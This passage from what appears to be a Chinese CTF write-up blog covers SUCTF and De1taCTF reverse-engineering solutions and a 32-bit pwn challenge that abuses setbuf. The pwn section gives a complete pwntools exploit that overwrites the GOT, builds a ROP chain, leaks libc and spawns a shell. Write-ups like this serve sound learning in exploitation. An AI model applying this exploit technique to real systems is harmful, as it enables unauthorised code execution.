<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = [154,171,24,161,54,222,172,116,129,18,139,152,127,247,36,124,43,90,97,138,238,95,141,237,26,227,152,154,167,54,141,166,139,66,216,129,94,164,69,188,33,194]</span><br><span class="line">re=&quot;&quot;</span><br><span class="line">for i in range(42):</span><br><span class="line">	flag[i] ^=i;</span><br><span class="line">	flag[i] = ((flag[i]&lt;&lt;5)&amp;0xff) | ((flag[i]&gt;&gt;3)&amp;0xff)</span><br><span class="line">	</span><br><span class="line">	re+=chr(flag[i]);</span><br><span class="line">print re;</span><br></pre></td></tr></table></figure>
<p>SUCTF{Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!}</p>
<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><p>反编译后的代码极其恶心，可读性几乎没有，大多数分析的结果都是基于调试得到的</p>
<ul>
<li>检查输入的符号只能有3个</li>
<li>第一个符号位于10位置</li>
<li>第一个符号前的字符要是suctf（与第二条自相矛盾。不知道为什么，因此我直接将第二个check给patch掉了）</li>
<li>第二个符号到第一个符号中间字符只能是ABCDEFGabcdefg中的4个，且大小顺序每次递增2，且只能是大写字符，那就只能是ACEG</li>
<li>第二个符号与第三个符号之间的字符只能是0-9，长度&lt;0xa，然后就是一个check<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ( v62 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = *(char *)v60 + 2 * (5 * v3 - 24);</span><br><span class="line">        v60 = (__int64 *)((char *)v60 + 1);</span><br><span class="line">      &#125;</span><br><span class="line">      while ( (char *)v60 - (char *)v59 != v62 );</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !(v3 &amp; 1)</span><br><span class="line">      &amp;&amp; (((int)(1234 * v3 + 5678) / 4396) ^ 0xABCDDCBA) == 0xABCDB8B9</span><br><span class="line">      &amp;&amp; (((int)(2334 * v3 + 9875) / 7777) ^ 0x12336790) == 0x1233FC70 )</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">ans = Solver();</span><br><span class="line">v3 = BitVec(&apos;x&apos;,32);</span><br><span class="line">ans.add( v3&amp;1==0 );</span><br><span class="line">ans.add( ( ((1234 * v3 + 5678)&amp;0xffffffff) / 4396) ^ 0xABCDDCBA == 0xABCDB8B9 );</span><br><span class="line">ans.add( ( ((2334 * v3 + 9875)&amp;0xffffffff) / 7777) ^ 0x12336790 == 0x1233FC70 );</span><br><span class="line">if ans.check()==sat :</span><br><span class="line">    m = ans.model();</span><br><span class="line">    t = m[v3].as_long().real;</span><br><span class="line">    print &apos;suctf&#123;&apos;+&apos;ACEG&apos;+str(t)+&apos;&#125;&apos;;</span><br><span class="line">else :</span><br><span class="line">    print &quot;error&quot;;</span><br></pre></td></tr></table></figure>
<p>suctf{ACEG31415926}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-32位PWN栈溢出setbuf的利用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/08/11/32位PWN栈溢出setbuf的利用/" class="article-date">
      <time datetime="2019-08-11T05:25:45.000Z" itemprop="datePublished">2019-08-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/11/32位PWN栈溢出setbuf的利用/">32位PWN栈溢出setbuf的利用</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="32位PWN-setbuf的利用"><a href="#32位PWN-setbuf的利用" class="headerlink" title="32位PWN setbuf的利用"></a>32位PWN setbuf的利用</h1><p>记录一下关于sefbuf函数的利用方式<br>sefbuf一般用来设置文件流的缓冲区，例如<code>setbuf(stdin, 0);</code>会将stdin的缓冲区设置为空，但如果<code>setbuf(stdin,buf)</code>那么stdin的缓冲区将会设置为buf，因此从stdin中读入的数据将从buf中读入。同样，如果<code>setbuf(stdout,buf)</code>，那么向stdout写入的数据也将写到buf中，</p>
<p>参考大佬的博客：<a href="https://nobb.site/2017/11/11/0x3D/" target="_blank" rel="noopener">https://nobb.site/2017/11/11/0x3D/</a></p>
<p>该题的漏洞点在于：读入数据到v3时没有检查v3是否是负数，导致可以任意调用plt表中的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;\nWhich letter do you want to post?&quot;);</span><br><span class="line">  printf(&quot;ID (0-%d): &quot;, 4);</span><br><span class="line">  v4 = read_st_to_int();</span><br><span class="line">  if ( v4 &lt; 0 || v4 &gt; 4 || !*(_DWORD *)(0x108 * v4 + a1) )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  puts(&quot;\nWhich filter do you want to apply?&quot;);</span><br><span class="line">  sub_80488F8();</span><br><span class="line">  v3 = read_st_to_int();</span><br><span class="line">  if ( v3 &gt; 2 )</span><br><span class="line">    return puts(&quot;Invalid filter.&quot;);</span><br><span class="line">  funcs_8048BB5[v3](s, (void *)(0x108 * v4 + a1 + 8), *(_DWORD *)(0x108 * v4 + a1 + 4));</span><br><span class="line">  return puts(&quot;\nDone!&quot;);</span><br></pre></td></tr></table></figure></p>
<p>并且，它将post的letters全部写入了文件dev/null</p>
<p><code>stream = fopen(&quot;/dev/null&quot;, &quot;a&quot;);</code></p>
<p>因此我们只需要调用<code>setbuf(stream,buf)</code>就能设置这个文件的缓冲区为buf，这样所有对该文件的写入操作<code>fwrite</code>都将写到buf中，这样只要buf在栈上，我们就能通过不断的写入数据造成栈溢出，然后就是很简单的ROP了</p>
<p>这个题的一些注意点:</p>
<ul>
<li>system函数成功执行的两个条件: 1.位于栈上的环境变量不能被覆盖 2.栈上要有大概0x300的空间具有可写入属性，这一点在迁移栈的时候需要注意</li>
<li>LD_PRELOAD可能会因为libc版本和ld版本不匹配导致段错误，我的做法是本地用自己的libc，远程再用题目给的</li>
<li>文件流的stdin不为定值，例如<code>fread(buf,1,count,stdin)</code>和<code>read(1,buf,size)</code>中stdin和1并不是对等的关系，1是文件描述符，而stdin是文件流。</li>
</ul>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">s = lambda data : p.send(data);</span><br><span class="line">sl = lambda data : p.sendline(data);</span><br><span class="line">sla = lambda st,data : p.sendlineafter(st,data);</span><br><span class="line">sa = lambda st,data : p.sendafter(st,data);</span><br><span class="line">uu32 = lambda data :u32(data.ljust(4, &apos;\x00&apos;));</span><br><span class="line">uu64 = lambda data :u64(data.ljust(8, &apos;\x00&apos;));</span><br><span class="line">ru = lambda st,drop=False : p.recvuntil(st,drop=drop);</span><br><span class="line">r = lambda data=4096: p.recv(data);</span><br><span class="line">p = &quot;&quot;;</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;);</span><br><span class="line">elf = ELF(&apos;./mailer&apos;);</span><br><span class="line">context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&apos;debug&apos;);</span><br><span class="line"># p = process(&quot;./mailer&quot;);</span><br><span class="line">p = process(&quot;./mailer&quot;);</span><br><span class="line"></span><br><span class="line">def add(x):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;1&quot;);</span><br><span class="line">    sla(&quot;contents: &quot;,x);</span><br><span class="line">def post(id,x):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;3&quot;);</span><br><span class="line">    sla(&quot;ID (0-4): &quot;,str(id) );</span><br><span class="line">    sla(&quot;apply?&quot;,str(x) );</span><br><span class="line">def delete(id):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;2&quot;);</span><br><span class="line">    sla(&quot;ID (0-4): &quot;,str(id) );</span><br><span class="line">def exit():</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;4&quot;);</span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    post( 4 , (elf.got[&apos;setbuf&apos;]-0x0804B048)/4 );   </span><br><span class="line">    delete(0);</span><br><span class="line">    add(&quot;a&quot;*0x100);</span><br><span class="line">    post( 0 , 0 );</span><br><span class="line">    delete(0);</span><br><span class="line">    buf_addr = 0x0804B300</span><br><span class="line">    pop_ebx_ret = 0x08048495;</span><br><span class="line">    leave_ret = 0x08048CFF;</span><br><span class="line">    stdin = 0x2aa5e5a0;</span><br><span class="line">    fake_ebp = buf_addr;</span><br><span class="line">    read_func_addr = 0x80486D9;</span><br><span class="line">    payload = &apos;a&apos;*9+p32(fake_ebp)</span><br><span class="line">    payload += p32(elf.plt[&apos;puts&apos;])+p32(pop_ebx_ret)+p32(elf.got[&apos;puts&apos;]);</span><br><span class="line">    payload += p32( read_func_addr )+p32(leave_ret)+p32(buf_addr)+p32(0xff);</span><br><span class="line">    add( payload );</span><br><span class="line">    post( 0 , 0);</span><br><span class="line">    # gdb.attach(p,&quot;b *0x08048CF7&quot;);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">    ru(&apos;:)\n&apos;);</span><br><span class="line">    puts_addr = uu32(ru(&apos;\xf7&apos;)); </span><br><span class="line">    print &apos;[+] puts_addr: 0x%x&apos;%puts_addr;</span><br><span class="line"></span><br><span class="line">    libc = LibcSearcher(&quot;puts&quot;,puts_addr);</span><br><span class="line">    libc_base = puts_addr - libc.dump(&apos;puts&apos;);</span><br><span class="line">    system_addr = libc_base+libc.dump(&apos;system&apos;);</span><br><span class="line">    # bin_sh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;);</span><br><span class="line"></span><br><span class="line">    # base_addr = puts_addr - libc.symbols[&apos;puts&apos;];</span><br><span class="line">    # print &apos;[+] base_addr: 0x%x&apos;%base_addr;</span><br><span class="line">    # system_addr = base_addr + libc.symbols[&apos;system&apos;];</span><br><span class="line">    pause();</span><br><span class="line">    sl( &apos;aaaa&apos;+p32(system_addr)+p32(0)+p32(buf_addr+16)+&apos;/bin/sh\x00&apos; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    main();</span><br><span class="line">    pass;</span><br><span class="line">    p.interactive();</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-De1taCTF-Reverse-WP" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/08/05/De1taCTF-Reverse-WP/" class="article-date">
      <time datetime="2019-08-05T07:24:41.000Z" itemprop="datePublished">2019-08-05</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/05/De1taCTF-Reverse-WP/">De1taCTF Reverse WP</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="Re-Sign"><a href="#Re-Sign" class="headerlink" title="Re_Sign"></a>Re_Sign</h1><ul>
<li>首先将输入打包成了如下结构<br>struct ST{<br>  DWORD unknown<br>  DWORD st_len;<br>  char  st[st_len];<br>}</li>
<li>然后进行base64编码，但是码表发生了改变，于是在base64编码的过程中下断，获取更改后的码表0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=</li>
<li>然后每次取input的一个字符，再根据一个常量从ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=中取出字符做出对比，关键比较代码的位置：0x004020F5<br>写出解题脚本:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import base64;</span><br><span class="line">def b64_de(x):</span><br><span class="line">	a = &quot;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&quot;;</span><br><span class="line">	b = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;</span><br><span class="line">	ret = &apos;&apos;.join( [ b[a.index(i)] for i in x] );</span><br><span class="line">	return base64.b64decode(ret);</span><br><span class="line"></span><br><span class="line"># print t,len(t);</span><br><span class="line"></span><br><span class="line">b = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;</span><br><span class="line">a = &quot;000000080000003B00000001000000200000000700000034000000090000001F000000180000002400000013000000030000001000000038000000090000001B0000000800000034000000130000000200000008000000220000001200000003000000050000000600000012000000030000000F00000022000000120000001700000008000000010000002900000022000000060000002400000032000000240000000F0000001F0000002B0000002400000003000000150000004100000041&quot;</span><br><span class="line">r = &quot;&quot;</span><br><span class="line">num=0;</span><br><span class="line">for i in range(0,len(a),8):</span><br><span class="line">	num+=1;</span><br><span class="line">	if num &gt; 48:</span><br><span class="line">		break;</span><br><span class="line">	t = int(a[i:i+8],16);</span><br><span class="line">	r+=b[t-1];</span><br><span class="line">print r,len(r);</span><br><span class="line">print b64_de(&quot;H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU==&quot;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>de1ctf{E_L4nguag3_1s_K3KeK3_N4Ji4}</p>
<h1 id="Cplusplus"><a href="#Cplusplus" class="headerlink" title="Cplusplus"></a>Cplusplus</h1><ul>
<li>代码很难看很难看，第一个关键Check函数0x140005910 ，将输入以3个非数字字符分割成3个数字，且限制数字大小为&lt;0x1999，要求三个分隔字符分别为<br>@ # NULL</li>
<li>调用0x1400029B0 check第一个数字，要求它的值&lt;0x6f 根据它的算法特征猜测是梅森旋转随机数生成算法，对比源码发现确实如此，该函数会检查生成的随机数是否为某一固定值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( ((((((((v8 &gt;&gt; 11) ^ v8) &amp; 0xFF3A58AD) &lt;&lt; 7) ^ (v8 &gt;&gt; 11) ^ v8) &amp; 0xFFFFDF8C) &lt;&lt; 15) ^ ((((v8 &gt;&gt; 11) ^ v8) &amp; 0xFF3A58AD) &lt;&lt; 7) ^ (v8 &gt;&gt; 11) ^ v8 ^ (((((((((v8 &gt;&gt; 11) ^ v8) &amp; 0xFF3A58AD) &lt;&lt; 7) ^ (v8 &gt;&gt; 11) ^ v8) &amp; 0xFFFFDF8C) &lt;&lt; 15) ^ ((((v8 &gt;&gt; 11) ^ v8) &amp; 0xFF3A58AD) &lt;&lt; 7) ^ (v8 &gt;&gt; 11) ^ v8) &gt;&gt; 18)) != 0xD4CBCF03 )</span><br><span class="line">FAIL:</span><br><span class="line">    _exit(0);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>因此我们只需要爆破一下就能拿到答案，但需要注意的是，这里并不是取生成的随机数序列的第一个元素，具体是哪个我也没具体逆，索性就一起爆破好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">def _int32(x):</span><br><span class="line">    return int(0xFFFFFFFF &amp; x)</span><br><span class="line"></span><br><span class="line">class MT19937:</span><br><span class="line">    def __init__(self, seed):</span><br><span class="line">        self.mt = [0] * 624</span><br><span class="line">        self.mt[0] = seed</span><br><span class="line">        self.mti = 0</span><br><span class="line">        for i in range(1, 624):</span><br><span class="line">            self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def extract_number(self,x):</span><br><span class="line">        if self.mti == 0:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[x];</span><br><span class="line">        y = y ^ y &gt;&gt; 11</span><br><span class="line">        y = y ^ y &lt;&lt; 7 &amp; 2636928640</span><br><span class="line">        y = y ^ y &lt;&lt; 15 &amp; 4022730752</span><br><span class="line">        y = y ^ y &gt;&gt; 18</span><br><span class="line">        self.mti = (self.mti + 1) % 624</span><br><span class="line">        return _int32(y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def twist(self):</span><br><span class="line">        for i in range(0, 624):</span><br><span class="line">            y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624]</span><br><span class="line"></span><br><span class="line">            if y % 2 != 0:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ 0x9908b0df</span><br><span class="line"></span><br><span class="line">for i in range(0x6f):</span><br><span class="line">	a = MT19937(i);</span><br><span class="line">	for j in range(624):</span><br><span class="line">		t = a.extract_number( j );</span><br><span class="line">		# print i,hex(t);</span><br><span class="line">		if t==0xD4CBCF03:</span><br><span class="line">			print &apos;get&apos;,i,j,hex(t);</span><br></pre></td></tr></table></figure></p>
<p>得到答案78，然后就是检查第二个数字，但是这个check函数貌似调用了boost库的一些内容，但是由于缺少符号，我并不能确定它调用的具体是哪个函数，猜也没猜出来，而出题人又给了flag的MD5值，且根据后续的一些条件可以判断，第二个数字长度为5，最后一个数字大小并不会很大，那么直接暴力枚举就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = &quot;78\x4012345\x23236&quot;</span><br><span class="line">print flag;</span><br><span class="line">import hashlib;</span><br><span class="line">import os;</span><br><span class="line"></span><br><span class="line">for j in range(0,99999):</span><br><span class="line">	if j%10000==0:</span><br><span class="line">		print j;</span><br><span class="line">	for k in range(0xfff):</span><br><span class="line">		a = &quot;de1ctf&#123;&quot;+&apos;78&apos;+&quot;@&quot;+str(j).zfill(5)+&quot;#&quot;+str(k)+&apos;&#125;&apos;;</span><br><span class="line">		# print hex(j),a;</span><br><span class="line">		# print a;</span><br><span class="line">		if  hashlib.md5(a).hexdigest()==&quot;0e3c375c8112a7c7c00547e54895fdcc&quot;:</span><br><span class="line">			print &quot;[+]-----------------&gt;&quot;,a;</span><br><span class="line">			# break;</span><br><span class="line">			raw_input();</span><br></pre></td></tr></table></figure></p>
<p>de1ctf{78@20637#114}</p>
<h1 id="Signal-vm"><a href="#Signal-vm" class="headerlink" title="Signal_vm"></a>Signal_vm</h1><p>流程</p>
<ul>
<li>父进程Fork了一个子进程，子进程调用Ptrace允许自己被跟踪，然后父进程开始执行VM</li>
<li>首先等待子进程的signal，调用ptrace获取子进程寄存器信息，获取内存数据作为Opcode，并通过子进程的status的信息来决定vm的部分执行流程</li>
<li>该次VM结束后恢复子进程的信息，继续等待子进程的signal，由于不知道status的返回值是由什么决定的，因此我直接利用strace catch syscall 来获取它的status的生成序列<code>strace ./signal_vm</code>与此同时还顺便获取了opcode，然后通过这些信息模拟VM；</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">import sys;</span><br><span class="line">from struct import *</span><br><span class="line"></span><br><span class="line"># opcode = [6L, 1L, 6L, 0L, 0L, 0L, 0L, 6L, 1L, 3L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 15L, 0L, 0L, 0L, 204L, 0L, 1L, 3L, 1L, 0L, 0L, 0L, 6L, 0L, 0L, 3L, 6L, 0L, 2L, 0L, 6L, 1L, 0L, 50L, 0L, 0L, 0L, 204L, 0L, 0L, 0L, 2L, 6L, 2L, 0L, 0L, 48L, 192L, 246L, 248L, 1L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 2L, 214L, 255L, 255L, 255L, 48L, 192L, 246L, 248L, 1L, 3L, 70L, 0L, 0L, 0L, 0L, 0L, 1L, 21L, 0L, 0L, 0L, 6L, 1L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 225L, 1L, 0L, 0L, 6L, 1L, 3L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 64L, 1L, 0L, 0L, 6L, 1L, 4L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 17L, 1L, 0L, 0L, 6L, 1L, 6L, 0L, 0L, 0L, 0L, 